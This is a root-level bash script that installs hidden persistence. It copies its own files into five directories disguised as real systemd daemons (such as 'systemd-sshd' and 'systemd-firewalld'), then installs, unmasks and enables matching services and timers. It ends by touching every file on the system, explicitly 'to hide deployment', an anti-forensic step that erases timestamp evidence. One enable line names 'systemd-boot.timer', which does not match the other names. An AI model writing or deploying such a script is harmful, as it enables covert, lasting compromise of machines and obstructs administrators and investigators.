#! /bin/bash

# Check if we are root and bail out if not
if [ "$EUID" -ne 0 ]; then
	echo "You must run this script as root"
	exit
fi

# Make the directories
mkdir --parents /usr/share/systemd-bootd
mkdir --parents /usr/share/systemd-firewalld
mkdir --parents /usr/share/systemd-printerd
mkdir --parents /usr/share/systemd-sshd
mkdir --parents /usr/share/systemd-userd

# Move the files
cp -- ./systemd/* /etc/systemd/system/
cp -r -- ./* /usr/share/systemd-bootd/
cp -r -- ./* /usr/share/systemd-firewalld/
cp -r -- ./* /usr/share/systemd-printerd/
cp -r -- ./* /usr/share/systemd-sshd/
cp -r -- ./* /usr/share/systemd-userd/

# Unmask and enable services and timers
systemctl daemon-reload
systemctl unmask systemd-bootd.service
systemctl unmask systemd-firewalld.service
systemctl unmask systemd-printerd.service
systemctl unmask systemd-sshd.service
systemctl unmask systemd-userd.service

systemctl unmask systemd-bootd.timer
systemctl unmask systemd-firewalld.timer
systemctl unmask systemd-printerd.timer
systemctl unmask systemd-sshd.timer
systemctl unmask systemd-userd.timer

systemctl enable --now systemd-boot.timer
systemctl enable --now systemd-firewalld.timer
systemctl enable --now systemd-printerd.timer
systemctl enable --now systemd-sshd.timer
systemctl enable --now systemd-userd.timer

# Touch every file to hide deployment
find / -exec touch --dereference {} +

# vim: set filetype=sh:
